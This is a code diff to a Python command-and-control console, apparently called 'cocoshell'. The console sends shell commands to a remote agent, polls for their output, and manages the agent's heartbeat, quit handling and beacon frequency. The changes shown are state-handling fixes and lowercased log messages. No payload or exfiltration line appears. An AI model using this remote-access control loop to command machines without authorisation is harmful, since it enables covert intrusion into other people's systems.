@@ -62,6 +62,7 @@ result = None
 prompt = "cocoshell"
 pwd = ''
 agent_has_connected = False
+agent_is_quitting = False
 
 #############################################################################
 
@@ -114,6 +115,8 @@ def command_has_timed_out(start):
 def reset_agent():
     cur.execute("UPDATE commands SET hasBeenRun = 1")
     cur.execute("UPDATE pwd SET pwd = 'NULL'")
+    con.commit()
+    return ['NULL', False]
 
 def cleanup():
     logger.debug("Cocoshell stopping")
@@ -128,6 +131,11 @@ def cleanup():
 
 try:
     while (True):
+        if agent_is_quitting:
+            time.sleep(frequency + 1)
+            logger.info("waiting for new agent to connect")
+            agent_is_quitting = False
+
         response = requests.get(agent_url + '/pwd')
         pwd = response.text
 
@@ -154,7 +162,7 @@ try:
             logger.failed("you cannot use dots in the command")
             continue
         if command in ["pulse"]:
-            logger.info(f"Agent last checked in at {get_heartbeat()}")
+            logger.info(f"agent last checked in at {get_heartbeat()}")
             continue
 
         waiting_for_result = new_command(command)
@@ -166,12 +174,13 @@ try:
             waiting_for_result = False
         if (command == "exit-agent"):
             waiting_for_result = False
-            logger.warning("Telling the agent to quit")
+            logger.warn("telling the agent to quit")
+            pwd, waiting_for_result, agent_is_quitting, agent_has_connected = ['NULL', False, True, False]
         if ("set-frequency" in command):
             waiting_for_result = False
             frequency_array = command.split("set-frequency")
             frequency_seconds = frequency_array[1].strip()
-            logger.info("Telling the agent to sleep for " + str(frequency_seconds) + " seconds between each request")
+            logger.info("telling the agent to sleep for " + str(frequency_seconds) + " seconds between each request")
             time.sleep(int(frequency))
             frequency = frequency_seconds
             cur.execute("UPDATE commands SET hasBeenRun = 1")
@@ -187,13 +196,13 @@ try:
                 command_start_time = None
                 result = get_last_result()
                 if result[2]:
-                    logger.debug("Received output from agent")
+                    logger.debug("received output from agent")
                     cleaned_result = result[2].replace('%NL%', os.linesep)
                     if cleaned_result != "True":
                         logger.message(cleaned_result)
                 else:
-                    logger.failed("No output for that command")
-                    logger.failed("The command probably failed")
+                    logger.failed("no output for that command")
+                    logger.failed("the command probably failed")
             else:
                 time.sleep(0.5)
     
